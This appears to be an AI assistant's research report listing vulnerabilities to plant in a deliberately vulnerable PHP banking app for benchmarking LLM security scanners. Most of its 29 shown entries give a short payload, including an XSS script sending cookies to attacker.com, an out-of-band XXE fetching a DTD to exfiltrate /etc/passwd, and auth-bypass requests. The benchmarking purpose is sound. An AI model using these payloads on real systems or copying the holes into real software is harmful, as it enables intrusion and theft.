I now have sufficient data to compose a comprehensive, well-cited report. Let me synthesize all findings.

---

# Research: Additional Web Application Vulnerabilities for VulnBank (PHP Deliberately Vulnerable Banking App)

## Summary

This report catalogs 40+ distinct vulnerability classes suitable for implementation in VulnBank, a deliberately vulnerable PHP banking application used to benchmark LLM-based SAST scanners. All entries are genuinely distinct from the already-implemented list (OWASP Top 10 basics, command injection, path traversal, unrestricted file upload, open redirect, eval/SSTI, unauthenticated CORS JSON API, exposed files, PHP unserialize(), MD5 passwords, session fixation). Each entry is prioritized for SAST detection difficulty: the hardest for LLM scanners are those requiring cross-file taint tracing, temporal separation between storage and use, semantic understanding of business logic, or knowledge of PHP runtime quirks. Vulnerabilities are grouped into 12 categories covering PHP-specific flaws, cryptographic weaknesses, business logic, race conditions, HTTP-level attacks, client-side attacks, authentication edge cases, API security, second-order vulnerabilities, injection variants, supply chain, and infrastructure misconfigurations.

---

## Vulnerability List

---

### Category 1 — PHP-Specific Vulnerabilities

**SAST difficulty: HIGH.** These require knowledge of PHP's type system, runtime behavior, and legacy function semantics. LLM scanners often miss the semantic difference between `==` and `===` or fail to recognize dangerous function signatures without full PHP runtime context.

---

**1. PHP Loose Comparison / Type Juggling Auth Bypass**
- **CWE-697** — Incorrect Comparison
- **Description:** PHP's `==` operator performs type coercion, causing values like the integer `0` to equal any non-numeric string, and "magic hash" strings beginning with `0e` to compare equal to each other.
- **Banking scenario:** The login function compares a stored password hash with a user-supplied value using `==` instead of `===`. A hash matching the pattern `0e[digits]` (e.g., password "240610708" produces MD5 `0e462097431906509019562988736854`) equals any other `0e...` hash under loose comparison.
- **Payload:** Supply any password whose MD5 begins with `0e`, such as `QNKCDZO` or `240610708`, to authenticate as any user whose stored MD5 hash also begins with `0e`.
- **SAST difficulty:** HIGH — requires knowing which PHP comparison operator is used and what the hash storage format is.

Sources: [PHP Type Juggling — kecman.co](https://kecman.co/blog/php-type-juggling-authentication-bypass.html), [Auth Bypass with PHP Type Juggling — cybernetgen.com](https://cybernetgen.com/blog/auth-bypass-with-php-type-juggling), [PHP Type Juggling — vickieli.dev](https://vickieli.dev/insecure%20deserialization/php-type-juggling/)

---

**2. PHP `extract()` / `parse_str()` Variable Overwrite (Mass Assignment)**
- **CWE-915** — Improperly Controlled Modification of Dynamically-Determined Object Attributes
- **Description:** `extract($_POST)` or `parse_str($_SERVER['QUERY_STRING'], $vars)` imports user-supplied keys directly into the current symbol table, overwriting any existing variable including authentication flags.
- **Banking scenario:** A transfer handler calls `extract($_POST)` then checks `if ($authorized)`. An attacker submits `authorized=1` in the POST body to bypass the authorization check entirely, or overwrites `$account_id` to redirect a transfer.
- **Payload:** `POST /transfer.php` with body `amount=1000&to=attacker&authorized=1&role=admin`
- **SAST difficulty:** HIGH — scanner must trace that `$authorized` originates from `extract()` and was never independently set.

Sources: [Critical Flaw in PHP's extract() — gbhackers.com](https://gbhackers.com/critical-flaw-in-phps-extract-function/), [Mass Assignment in PHP — secureflag.com](https://knowledge-base.secureflag.com/vulnerabilities/inadequate_input_validation/mass_assignment_php.html), [Mass Assignment CWE-915 — hacktricks.wiki](https://hacktricks.wiki/en/pentesting-web/mass-assignment-cwe-915.html)

---

**3. PHAR Deserialization via File System Functions**
- **CWE-502** — Deserialization of Untrusted Data (triggered via stream wrapper, not `unserialize()` directly)
- **Description:** PHP's `phar://` stream wrapper automatically deserializes a PHAR archive's metadata when any filesystem function (`file_exists`, `fopen`, `is_file`, etc.) is called on it — without any explicit `unserialize()` call.
- **Banking scenario:** The app allows uploading a profile avatar and validates using `getimagesize($path)`. An attacker uploads a PHAR file with a GIF89a magic header containing a serialized POP chain in its metadata, then triggers `file_exists("phar://uploads/avatar.gif")` via a filename-based feature.
- **Payload:** Upload `evil.gif` (PHAR file disguised as image); trigger via any path that calls a filesystem function on the uploaded file using the `phar://` wrapper.
- **SAST difficulty:** VERY HIGH — requires understanding that `getimagesize()` can act as a deserialization sink when called on a phar-prefixed path, and that the upload and trigger are in separate files.

Sources: [How to exploit PHAR deserialization — pentest-tools.com](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability), [File Operation Induced Unserialization via phar:// — Black Hat 2018](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf), [Phar Deserialization leads to RCE — hackmd.io](https://hackmd.io/@winky/Skof1Ljwxl)

---

**4. `preg_replace()` with `/e` Modifier (Legacy Code Execution)**
- **CWE-94** — Improper Control of Generation of Code ('Code Injection')
- **Description:** In PHP < 7.0, the `preg_replace()` `/e` modifier evaluates the replacement string as PHP code after substitution, enabling RCE when user input reaches the replacement argument.
- **Banking scenario:** A legacy transaction note formatter uses `preg_replace('/\{(\w+)\}/e', '$data["\\1"]', $template)` where `$template` is partially user-controlled (e.g., a URL parameter for email template selection).
- **Payload:** Inject `{${system(id)}}` or `preg_replace('/x/e','system("id")', 'x')` into the template parameter.
- **SAST difficulty:** HIGH — requires recognizing the `/e` flag inside a string literal and tracing which argument is user-controlled.

Sources: [PHP Code Execution via preg_replace /e — github.com/pear](https://github.com/pear/pearweb/security/advisories/GHSA-vhw6-hqh9-8r23), [PHP rfc: remove_preg_replace_eval_modifier — wiki.php.net](https://wiki.php.net/rfc/remove_preg_replace_eval_modifier), [Code Execution — preg_replace Exploitation — yeahhub.com](https://www.yeahhub.com/code-execution-preg_replace-php-function-exploitation/)

---

**5. Null Byte Injection (Poison Null Byte)**
- **CWE-626** — Null Byte Interaction Error
- **Description:** In PHP < 5.3.4, a null byte (`%00`) in a string passed to filesystem functions terminates the string at the C level, truncating appended extensions.
- **Banking scenario:** A statement downloader appends `.pdf` to user input: `include("statements/" . $_GET['month'] . ".pdf")`. An attacker supplies `../../etc/passwd%00` to strip the `.pdf` extension and include arbitrary files.
- **Payload:** `GET /statements.php?month=../../etc/passwd%00`
- **SAST difficulty:** MEDIUM-HIGH — scanner must know that `%00` is decoded and that PHP's C-level string handling truncates at null bytes, and must trace the concatenation pattern.

Sources: [Null byte injection in PHP — infosecinstitute.com](https://www.infosecinstitute.com/resources/secure-coding/null-byte-injection-php/), [CWE-626 — cwe.mitre.org](https://cwe.mitre.org/data/definitions/626.html), [CVE-2025-1220: Null byte bypass in PHP — hadrian.io](https://hadrian.io/blog/cve-2025-1220-null-byte-trickery-bypasses-hostname-allowlists-in-php)

---

**6. `php://filter` Chain for Source Code Disclosure / LFI Amplification**
- **CWE-22** — Path Traversal (via stream wrapper abuse)
- **Description:** PHP's `php://filter` wrapper can be chained with `convert.base64-encode` to read any included PHP file as base64 without executing it, revealing source code through an LFI endpoint.
- **Banking scenario:** A page loader `include($_GET['page'] . '.php')` is protected against direct PHP execution but not against `php://filter/convert.base64-encode/resource=config`.
- **Payload:** `GET /load.php?page=php://filter/convert.base64-encode/resource=../config`
- **SAST difficulty:** HIGH — scanner must understand PHP stream wrapper semantics and that `php://filter` is a valid prefix for `include()`.

Sources: [From LFI to LFD: Exploiting PHP Wrappers — medium.com/@zoningxtr](https://medium.com/@zoningxtr/from-lfi-to-lfd-exploiting-php-wrappers-to-steal-sensitive-data-like-a-pro-%EF%B8%8F-%EF%B8%8F-ec7385b49ea1), [PayloadsAllTheThings PHP.md — github.com](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md)

---

### Category 2 — Authentication Edge Cases

**SAST difficulty: HIGH.** These live at the intersection of protocol/library semantics and application logic, requiring the scanner to understand multi-step flows and trust-boundary decisions.

---

**7. JWT Algorithm Confusion (`alg:none` / RS256→HS256 Downgrade)**
- **CWE-347** — Improper Verification of Cryptographic Signature
- **Description:** Libraries that trust the `alg` header field in a JWT allow attackers to switch from `RS256` to `HS256` and sign tokens with the public key, or to set `alg: none` to bypass signature verification entirely.
- **Banking scenario:** The API authenticates users via JWT. The PHP JWT library is misconfigured to not enforce the expected algorithm. An attacker decodes a valid token, changes `{"alg":"none"}` or `{"alg":"HS256"}`, modifies `{"role":"admin"}`, re-encodes, and removes or replaces the signature.
- **Payload:** Base64url-encode `{"alg":"none","typ":"JWT"}` + `{"sub":"1","role":"admin"}` + empty signature.
- **SAST difficulty:** VERY HIGH — requires knowing that a particular library version passes algorithm choice from the token header, which is a library-level semantic, not visible from source alone.

Sources: [JWT Algorithm Confusion — aquilax.ai](https://aquilax.ai/blog/jwt-algorithm-confusion-auth-bypass), [JWT Algorithm Confusion Attacks — workos.com](https://workos.com/blog/jwt-algorithm-confusion-attacks), [CWE-347 Remediation — dipsylala.github.io](https://dipsylala.github.io/FlawFixingGuidance/CWE-347/)

---

**8. OAuth 2.0 Misconfiguration — Missing State / Open Redirect in Redirect URI**
- **CWE-601** — URL Redirection to Untrusted Site (Open Redirect) in OAuth context
- **Description:** An OAuth implementation that omits CSRF protection via the `state` parameter, uses the implicit flow, or validates redirect URIs with prefix-matching allows attackers to steal authorization codes or tokens.
- **Banking scenario:** The bank's "Login with Google" feature does not validate the `state` parameter. An attacker crafts a malicious link embedding their own `redirect_uri`, intercepts the authorization code, and completes login as the victim.
- **Payload:** `GET /oauth/authorize?client_id=bank&redirect_uri=https://attacker.com/steal&response_type=code` (no `state` checked)
- **SAST difficulty:** HIGH — requires tracing the OAuth flow across multiple files and verifying that `state` is generated, stored in session, and verified on callback.

Sources: [OAuth Misconfiguration Vulnerabilities — blog.intelligencex.org](https://blog.intelligencex.org/oauth-misconfiguration-vulnerabilities-attacks-prevention-guide), [OAuth 2.0 Security Best Practices — authgear.com](https://www.authgear.com/post/oauth2-security-best-practices-pkce-state/), [Common OAuth Vulnerabilities — doyensec.com](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)

---

**9. Host Header Injection — Password Reset Poisoning**
- **CWE-644** — Improper Neutralization of HTTP Headers for Scripting Syntax
- **Description:** When a password reset link is generated using the `Host` header from the request, an attacker who can spoof that header (or use `X-Forwarded-Host`) can redirect reset tokens to an attacker-controlled domain.
- **Banking scenario:** `reset_password.php` builds the link as `"https://" . $_SERVER['HTTP_HOST'] . "/reset?token=" . $token`. An attacker requests a password reset for a victim while sending `Host: attacker.com`; the victim receives an email with a reset link pointing to `attacker.com`.
- **Payload:** `POST /forgot-password` with header `Host: attacker.com` (or `X-Forwarded-Host: attacker.com`).
- **SAST difficulty:** HIGH — requires recognizing that `$_SERVER['HTTP_HOST']` is attacker-controlled and that it flows into email content without validation.

Sources: [Basic password reset poisoning — medium.com/@sakibahamed007](https://medium.com/@sakibahamed007/writeup-portswigger-academy-basic-password-reset-poisoning-217e4b5f9759), [HTTP Host header attacks notes — attacker-codeninja.github.io](https://attacker-codeninja.github.io/2021-09-09-portswigger-notes-on-host-header-attack/), [Password reset poisoning — portswigger.net](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)

---

**10. Predictable Password Reset Token (Weak PRNG)**
- **CWE-330** — Use of Insufficiently Random Values
- **Description:** Using `mt_rand()`, `rand()`, or timestamp-based tokens for password reset links allows attackers to predict or brute-force the token within a feasible search space.
- **Banking scenario:** `reset_token.php` generates tokens as `md5(time() . $email)`. Since `time()` has 1-second granularity, an attacker who knows the reset was requested within a 60-second window needs to check only 60 possible tokens.
- **Payload:** Script that iterates `md5(timestamp . victim@bank.com)` for every second in the last 60 seconds.
- **SAST difficulty:** HIGH — scanner must recognize that `time()` or `mt_rand()` is cryptographically weak and that the token is used in a security-critical context.

Sources: [Predictable Password Reset Token — cvefeed.io CVE-2022-29174](https://cvefeed.io/vuln/detail/CVE-2022-29174), [I Forgot Your Password: Randomness Attacks Against PHP — usenix.org](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final218.pdf), [Insecure Randomness — owasp.org](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness), [php_mt_seed cracker — openwall.com](https://www.openwall.com/php_mt_seed/)

---

**11. Username / Email Enumeration via Differential Response**
- **CWE-204** — Observable Response Discrepancy
- **Description:** Authentication and password-reset endpoints return different HTTP status codes, response bodies, or response times for valid vs. invalid usernames, leaking user existence.
- **Banking scenario:** `POST /login` returns `"Invalid password"` for existing users and `"Account not found"` for non-existing ones, allowing enumeration of all registered account emails.
- **Payload:** Automated script comparing response text across a wordlist of email addresses to extract valid accounts.
- **SAST difficulty:** MEDIUM — requires cross-referencing the response construction logic with branch conditions that differ based on DB lookup results.

Sources: [Password Reset Flaws — medium.com/@cybersphere.official](https://medium.com/@cybersphere.official/password-reset-flaws-the-easiest-account-takeover-vector-17f24f65d094), [Cracking Password Reset Mechanisms — blog.sentry.security](https://blog.sentry.security/cracking-password-reset-mechanisms/)

---

### Category 3 — Business Logic Flaws

**SAST difficulty: VERY HIGH.** These require understanding the application's intended behavior — no syntactic pattern indicates a flaw. LLM scanners must reason about domain invariants (e.g., "a balance should never go negative").

---

**12. Negative Amount Transfer (Missing Sign Validation)**
- **CWE-20** — Improper Input Validation
- **Description:** A funds transfer endpoint that does not reject negative amounts allows an attacker to transfer a negative sum, effectively pulling money from the recipient's account into their own.
- **Banking scenario:** `POST /transfer` with `amount=-500&to=attacker_account` causes the server to subtract -500 from the sender's balance (adding 500) and add -500 to the recipient's balance (subtracting 500).
- **Payload:** `amount=-500.00&to_account=9999`
- **SAST difficulty:** VERY HIGH — no syntactic flaw; requires understanding that the absence of `if ($amount <= 0)` is the vulnerability.

Sources: [Business Logic Flaws — medium.com/@instatunnel](https://medium.com/@instatunnel/business-logic-flaws-the-vulnerabilities-no-scanner-can-find-b52d64692f4d), [Business Logic Errors — book.jorianwoltjer.com](https://book.jorianwoltjer.com/other/business-logic-errors)

---

**13. Integer Overflow on Balance / Transaction Amount**
- **CWE-190** — Integer Overflow or Wraparound
- **Description:** Storing transaction amounts in a PHP integer or a DB `INT` column that wraps around on overflow allows amounts beyond `PHP_INT_MAX` to roll over to negative values.
- **Banking scenario:** A loan application computes `$monthly_payment = (int)($total / $months)`. Supplying a total amount exceeding `PHP_INT_MAX` causes the cast to wrap to a negative number, granting the attacker a loan with negative monthly repayments (effectively crediting them).
- **Payload:** `total=9999999999999999999&months=12`
- **SAST difficulty:** HIGH — requires recognizing that `(int)` casting of very large strings overflows silently.

Sources: [Integer Overflow Attack — zimperium.com](https://zimperium.com/glossary/integer-overflow-attack), [Business Logic Vulnerabilities part-5: Low-level logic flaw — medium.com/@AhmadSopyan](https://medium.com/@AhmadSopyan/business-logic-vulnerabilities-part-4-low-level-logic-flaw-8cc94d37003c)

---

**14. Floating-Point Rounding / Fractional Cent Accumulation (Salami Attack)**
- **CWE-681** — Incorrect Conversion between Numeric Types
- **Description:** Financial computations using IEEE 754 floating-point arithmetic lose sub-cent fractions that can be harvested by an attacker making many small transactions.
- **Banking scenario:** An interest calculation rounds down to 2 decimal places. The fractional remainder (`0.004` per transaction) is discarded instead of accumulated back into an account. An attacker automates 100,000 tiny transfers, with each rounding error depositing fractions to a controlled account.
- **Payload:** Script making repeated transfers of `$0.001` exploiting the rounding direction.
- **SAST difficulty:** VERY HIGH — requires understanding that PHP float arithmetic is imprecise and that the accumulation pattern constitutes a security flaw.

Sources: [Business Logic Errors — book.jorianwoltjer.com](https://book.jorianwoltjer.com/other/business-logic-errors), [Business Logic Vulnerabilities — legitsecurity.com](https://www.legitsecurity.com/aspm-knowledge-base/business-logic-vulnerabilities)

---

**15. Coupon / Voucher Reuse (One-Time Code Not Invalidated)**
- **CWE-840** — Business Logic Errors
- **Description:** A promotional discount or fee-waiver code that is not atomically invalidated after first use can be applied multiple times.
- **Banking scenario:** A fee-waiver voucher marks itself as `used = 1` in a separate UPDATE after the fee reduction is already applied. Due to the non-atomic check-then-use pattern, the code can be applied in parallel requests before the UPDATE commits.
- **Payload:** Concurrent `POST /apply-voucher` requests with the same voucher code.
- **SAST difficulty:** HIGH — requires understanding the temporal gap between the check and the invalidation update.

Sources: [Ultimate Bug Bounty guide to race condition vulnerabilities — yeswehack.com](https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-race-condition-vulnerabilities), [Business Logic Flaws — medium.com/@instatunnel](https://medium.com/@instatunnel/business-logic-flaws-the-vulnerabilities-no-scanner-can-find-b52d64692f4d)

---

**16. Privilege Escalation via Mass Assignment on API Update Endpoint**
- **CWE-915** — Improperly Controlled Modification of Dynamically-Determined Object Attributes
- **Description:** An API `PUT /api/users/me` endpoint that auto-binds all JSON fields to the user model allows submission of protected fields like `role`, `is_admin`, or `account_tier`.
- **Banking scenario:** `PUT /api/users/me` accepts `{"name":"Alice","role":"admin"}`. The controller passes `$_PUT_DATA` directly to an ORM's `update()` method without an explicit field allowlist, promoting the user to admin.
- **Payload:** `{"name":"Alice","role":"admin","credit_limit":999999}`
- **SAST difficulty:** HIGH — requires tracing that the ORM `update()` call receives unsanitized user input and that protected fields are not excluded.

Sources: [OWASP API Security — Mass Assignment](https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/), [Mass Assignment in PHP — secureflag.com](https://knowledge-base.secureflag.com/vulnerabilities/inadequate_input_validation/mass_assignment_php.html), [CWE-915 — code2night.com](https://www.code2night.com/blog/myblog/cwe915-mass-assignment-vulnerability-securing-object-binding-in-web-apis)

---

### Category 4 — Race Conditions / TOCTOU

**SAST difficulty: VERY HIGH.** Pure static analysis cannot easily detect concurrency flaws without data-flow understanding of shared state and missing locks or transactions.

---

**17. Double-Spend Race Condition on Balance Transfer**
- **CWE-362** — Concurrent Execution using Shared Resource with Improper Synchronization
- **Description:** A transfer handler that reads the balance, checks sufficiency in PHP, then writes the new balance — all without a database transaction or row-level lock — allows concurrent requests to all pass the balance check before any deduction is committed.
- **Banking scenario:** User with $100 sends two concurrent requests to transfer $80 each. Both read balance = $100, both pass the `$balance >= $amount` check, both proceed to deduct, resulting in $0 or negative balance while $160 is credited to the destination.
- **Payload:** Send two simultaneous `POST /transfer` requests using threading or `curl --parallel`.
- **SAST difficulty:** VERY HIGH — the flaw is the absence of `BEGIN TRANSACTION` / `SELECT ... FOR UPDATE` in the source, not the presence of a dangerous pattern.

Sources: [AVideo TOCTOU Race Condition CVE-2026-34368 — advisories.gitlab.com](https://advisories.gitlab.com/pkg/composer/wwbn/avideo/CVE-2026-34368/), [Race Condition & TOCTOU — a7.de](https://a7.de/en/wiki/race-condition-toctou-timing-based-security-vulnerability/), [CWE-362 — cwe.mitre.org](https://cwe.mitre.org/data/definitions/362.html)

---

**18. TOCTOU on File Existence Check Before Processing**
- **CWE-367** — Time-of-Check Time-of-Use (TOCTOU) Race Condition
- **Description:** An application that checks `file_exists()` before processing an uploaded file allows an attacker to replace the file between the check and the use (a symlink swap).
- **Banking scenario:** A statement-import feature checks `if (file_exists($path) && pathinfo($path)['extension'] === 'csv')` then calls `fopen($path)`. Between the two calls, the attacker replaces the CSV with a symlink to `/etc/passwd`.
- **Payload:** Race condition tool that loops swapping `upload.csv` ↔ symlink to `/etc/passwd` while the import is processing.
- **SAST difficulty:** HIGH — requires understanding the gap between `file_exists()` and the subsequent `fopen()`.

Sources: [Race Condition / TOCTOU — offensive360.com](https://offensive360.com/knowledge-base/race-condition/), [CWE-362 — cwe.mitre.org](https://cwe.mitre.org/data/definitions/362.html)

---

### Category 5 — Cryptographic Weaknesses

**SAST difficulty: MEDIUM-HIGH.** These are detectable by scanners that know the unsafe function list, but harder to detect when the weak crypto is hidden behind abstraction layers or library wrappers.

---

**19. Insufficient Password Hash Iterations (Fast Hash for Passwords)**
- **CWE-916** — Use of Password Hash With Insufficient Computational Effort
- **Description:** Using SHA-1, SHA-256, or a single bcrypt iteration count of 4 for password storage provides insufficient work factor, allowing offline cracking of stolen hashes.
- **Banking scenario:** `password_hash($pwd, PASSWORD_BCRYPT, ['cost' => 4])` or `sha1($pwd . $salt)` is used. A stolen database is cracked in minutes with modern GPU rigs.
- **Payload:** Offline dictionary attack against exported hashes using hashcat.
- **SAST difficulty:** MEDIUM — scanner must know that `sha1()` / `md5()` / `hash('sha256', ...)` are inappropriate for passwords AND that bcrypt with cost < 10 is insufficient.

Sources: [CWE-916 — cwe.mitre.org](https://cwe.mitre.org/data/definitions/916.html), [Understanding CWE-916 — medium.com/@waltermoar](https://medium.com/@waltermoar/understanding-cwe-916-use-of-password-hash-with-insufficient-computational-effort-17819a2476f9)

---

**20. AES-ECB Mode Encryption of Sensitive Data**
- **CWE-327** — Use of a Broken or Risky Cryptographic Algorithm
- **Description:** Encrypting data with AES in ECB mode produces identical ciphertext for identical plaintext blocks, revealing patterns in the ciphertext.
- **Banking scenario:** Account numbers are encrypted with AES-ECB for storage in URLs. An attacker observes that `account=AAA` and `account=BBB` produce the same ciphertext block for identical 16-byte prefixes, allowing block boundary manipulation to decrypt or forge account identifiers.
- **Payload:** Capture and rearrange ciphertext blocks to construct a valid encrypted value for a target account.
- **SAST difficulty:** MEDIUM — scanner must flag `MCRYPT_MODE_ECB` or `openssl_encrypt(..., 'AES-128-ECB', ...)` as the vulnerable pattern.

Sources: [ECB mode is insecure — docs.datadoghq.com](https://docs.datadoghq.com/security/code_security/static_analysis/static_analysis_rules/java-security/cipher-padding-oracle/), [Padding Oracle Vulnerability — secureflag.com](https://knowledge-base.secureflag.com/vulnerabilities/broken_cryptography/padding_oracle_vulnerability.html)

---

**21. CBC Padding Oracle Attack**
- **CWE-649** — Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking
- **Description:** Decrypting an AES-CBC ciphertext and returning different responses for valid vs. invalid PKCS#7 padding leaks one bit per query, allowing plaintext recovery or ciphertext forgery.
- **Banking scenario:** An encrypted session cookie is decrypted server-side and different error messages are returned for padding errors vs. authentication errors. An attacker sends modified ciphertexts and observes responses to recover the plaintext cookie value or forge a new one.
- **Payload:** Padding oracle script (e.g., padbuster) targeting the cookie decryption endpoint.
- **SAST difficulty:** HIGH — requires recognizing that a decryption routine returns padding-sensitive errors AND that the ciphertext is user-controlled.

Sources: [CBC Padding Oracle Attacks — brunorochamoura.com](https://www.brunorochamoura.com/posts/cbc-padding-oracle/), [Cracking AES With Padding Oracle Attacks — anishgoyal.com](https://anishgoyal.com/writeups/cracking-aes-with-padding-oracle-attacks/)

---

**22. Predictable CSRF Token via Weak PRNG**
- **CWE-330** — Use of Insufficiently Random Values
- **Description:** CSRF tokens generated with `mt_rand()` or `uniqid()` are predictable because both functions have small state spaces and non-cryptographic outputs.
- **Banking scenario:** `$csrf = md5(uniqid())` is used as a CSRF token. `uniqid()` uses microseconds and is predictable within a timing window, allowing an attacker who can observe one token to predict subsequent ones.
- **Payload:** Observe a CSRF token, estimate the `uniqid()` seed range, enumerate candidates, and submit a forged state-changing request.
- **SAST difficulty:** HIGH — scanner must recognize `uniqid()` is non-cryptographic and that its output feeds a security-critical token.

Sources: [Insecure Randomness — owasp.org](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness), [Insufficient Entropy For Random Values — phpsecurity.readthedocs.io](https://phpsecurity.readthedocs.io/en/latest/Insufficient-Entropy-For-Random-Values.html), [php_mt_seed — openwall.com](https://www.openwall.com/php_mt_seed/)

---

### Category 6 — Second-Order / Stored Vulnerabilities

**SAST difficulty: VERY HIGH.** These require multi-step taint tracing: data is stored in one request and consumed dangerously in a different code path, often in a different file or module.

---

**23. Second-Order SQL Injection**
- **CWE-89** — SQL Injection (second-order)
- **Description:** User input is sanitized and safely stored in the database, but is later retrieved and used in a SQL query without re-sanitization, because developers assumed stored data is trusted.
- **Banking scenario:** A username containing `' OR 1=1--` is safely inserted during registration. Later, an internal report feature queries `SELECT * FROM accounts WHERE owner = '$username'` after fetching `$username` from the DB without parameterization, triggering injection.
- **Payload:** Register with username `admin'--`, then access the report page to trigger the second-order query.
- **SAST difficulty:** VERY HIGH — requires tracing across the DB storage boundary: injection input → DB store → DB fetch → SQL query construction.

Sources: [SQL injection (second order) — portswigger.net](https://portswigger.net/kb/issues/00100210_sql-injection-second-order), [Web Security Series #9: Second-Order SQL Injection — medium.com/@laibakashif0011](https://medium.com/@laibakashif0011/web-security-series-9-exploiting-second-order-sql-injection-via-stored-user-input-32b89387e86b)

---

**24. Blind/Second-Order Stored XSS Targeting Admin Panel**
- **CWE-79** — Improper Neutralization of Input During Web Page Generation (XSS)
- **Description:** An XSS payload stored during user registration or transaction notes is reflected in an admin dashboard that does not apply output encoding, giving the attacker admin-level code execution.
- **Banking scenario:** A customer sets their display name to `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`. The admin views a customer management page that renders this name without encoding, exfiltrating the admin's session cookie.
- **Payload:** Any `<script>` or event-handler payload stored in any field rendered in the admin interface.
- **SAST difficulty:** VERY HIGH — the input is in user registration (file A), the sink is the admin panel render (file B), with a DB round-trip in between.

Sources: [Blind/Stored XSS in Admin Panel — octayus.medium.com](https://octayus.medium.com/discovering-two-out-of-scope-blind-stored-xss-vulnerabilities-in-an-admin-panel-on-a-public-bug-c0262fa35238), [Stored XSS — portswigger.net](https://portswigger.net/web-security/cross-site-scripting/stored)

---

### Category 7 — Injection Variants

**SAST difficulty: MEDIUM-HIGH.** Each injection type has its own syntax and sink set, and LLM scanners trained heavily on SQL injection may miss less-common injection types.

---

**25. NoSQL Injection (MongoDB Operator Injection)**
- **CWE-943** — Improper Neutralization of Special Elements in Data Query Logic
- **Description:** PHP applications passing unsanitized `$_POST` arrays to MongoDB queries allow injection of operators like `$ne`, `$gt`, `$regex`, or `$where` to bypass authentication or extract data.
- **Banking scenario:** `$collection->findOne(['email' => $_POST['email'], 'password' => $_POST['password']])`. A request with `password[$ne]=x` constructs `{password: {$ne: "x"}}` which matches any document.
- **Payload:** `email=admin@bank.com&password[$ne]=anything`
- **SAST difficulty:** HIGH — requires understanding that PHP array deserialization from HTTP input maps to MongoDB query operators.

Sources: [Authentication bypass via MongoDB operator injection — invicti.com](https://www.invicti.com/web-application-vulnerabilities/authentication-bypass-via-mongodb-operator-injection), [NoSQL Injection Leading to Authentication Bypass — github.com/Yooooomi](https://github.com/Yooooomi/your_spotify/security/advisories/GHSA-c8wf-wcjc-2pvm), [CWE-943 — github.com/securitylab](https://github.com/github/securitylab/issues/342)

---

**26. LDAP Injection**
- **CWE-90** — Improper Neutralization of Special Elements used in an LDAP Query
- **Description:** User input incorporated into an LDAP query without escaping allows attackers to modify the query structure, bypass authentication, or enumerate the directory.
- **Banking scenario:** Corporate banking login uses LDAP: `ldap_search($ds, "ou=users,dc=bank,dc=com", "(&(uid=$user)(userPassword=$pass))")`. Supplying `*)(uid=*)` as the username yields `(&(uid=*)(uid=*)(userPassword=...))` which matches all entries.
- **Payload:** `username=*)(uid=*)&password=anything`
- **SAST difficulty:** MEDIUM-HIGH — scanner must recognize LDAP query construction functions and unsanitized user input flowing into them.

Sources: [LDAP Injection CWE-90 — immuniweb.com](https://www.immuniweb.com/vulnerability/ldap-injection.html), [CWE-90 — cwe.mitre.org](https://cwe.mitre.org/data/definitions/90.html), [LDAP injection — portswigger.net](https://portswigger.net/kb/issues/00100500_ldap-injection)

---

**27. Email Header Injection via PHP `mail()`**
- **CWE-93** — Improper Neutralization of CRLF Sequences ('CRLF Injection')
- **Description:** PHP's `mail()` function is vulnerable to header injection when user-supplied input is placed in header arguments without stripping CRLF sequences, allowing attackers to add arbitrary headers, Bcc recipients, or change the email body.
- **Banking scenario:** `mail($to, $_POST['subject'], $body)` — an attacker submits `subject=Statement%0ACc:%20attacker@evil.com%0A` injecting a Cc header that copies all statements to the attacker.
- **Payload:** `subject=Your+Statement%0D%0ABcc:%20attacker@attacker.com`
- **SAST difficulty:** MEDIUM — scanner must recognize `mail()` usage and trace user input into its header arguments.

Sources: [Email Header Injection Vulnerabilities — researchgate.net](https://www.researchgate.net/publication/315327239_E-mail_Header_Injection_Vulnerabilities), [LDAP Injection CWE-90 / email injection context — immuniweb.com](https://www.immuniweb.com/vulnerability/ldap-injection.html)

---

**28. XML Billion Laughs (Exponential Entity Expansion DoS)**
- **CWE-776** — Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')
- **Description:** A specially crafted XML document with deeply nested entity references that expand exponentially can exhaust server memory and cause denial of service.
- **Banking scenario:** An XML-based bank statement import endpoint parses uploaded XML with `libxml_disable_entity_loader(false)`. An attacker uploads a file with 10 levels of nested `<!ENTITY>` references, each expanding to 10x the size, producing 10 billion bytes of expansion.
- **Payload:** Standard billion laughs XML document with `&lol9;` entity chain.
- **SAST difficulty:** MEDIUM — scanner must check that `LIBXML_NOENT` is not set and that entity loading is not disabled.

Sources: [XML External Entity (XXE) and Billion Laughs — geeksforgeeks.org](https://www.geeksforgeeks.org/xml-external-entity-xxe-and-billion-laughs-attack/), [Billion laughs attack — wikipedia.org](https://en.wikipedia.org/wiki/Billion_laughs_attack), [XML Vulnerabilities cheatsheet — gist.github.com/jordanpotti](https://gist.github.com/jordanpotti/04c54f7de46f2f0f0b4e6b8e5f5b01b0)

---

**29. Blind Out-of-Band XXE (OOB-XXE Data Exfiltration)**
- **CWE-611** — Improper Restriction of XML External Entity Reference
- **Description:** An XML parser that does not echo entity contents in responses but does make outbound DNS/HTTP requests enables out-of-band data exfiltration by hosting a malicious external DTD.
- **Banking scenario:** A SOAP or XML-based API for wire transfers processes XML silently. The attacker injects an external DTD reference that exfiltrates file contents via DNS lookup to `attacker.com`.
- **Payload:** `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>` where the evil DTD chains parameter entities to exfiltrate `/etc/passwd`.
- **SAST difficulty:** HIGH — the exfiltration channel is external (DNS/HTTP), invisible in the source; scanner must trace the XML parsing call and verify entity loader state.

Sources: [Out-of-Band XXE — invicti.com](https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe), [Blind XXE — portswigger.net](https://portswigger.net/web-security/xxe/blind)

---

